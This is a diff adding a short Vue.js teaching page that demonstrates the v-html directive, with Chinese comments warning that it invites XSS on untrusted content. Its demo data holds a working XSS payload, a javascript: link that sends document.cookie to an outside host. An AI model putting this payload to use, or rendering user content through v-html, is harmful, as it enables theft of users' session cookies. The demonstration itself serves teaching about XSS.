@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="./lib/vue.js"></script>
+</head>
+
+<body>
+    <div id="box">
+        {{ vhtml }}
+        <div v-html="vhtml"></div>
+    </div>
+
+
+    <script>
+
+        function fn(){
+            console.log(1231231231);
+        }
+
+        var vm = new Vue({
+            el: "#box",
+            data: {
+                // 为了防止XSS攻击，不要在动态渲染的元素上使用 v-html 指令！
+                // 在网站上动态渲染任意 HTML 是非常危险的，因为容易导致 XSS 攻击。只在可信内容上使用 v-html，永不用在用户提交的内容上。
+                vhtml: "<a href=javascript:location.href='https://www.baidu.com?cookie='+document.cookie;>点击此处</a>"
+            }
+        });
+    </script>
+</body>
+
+</html>
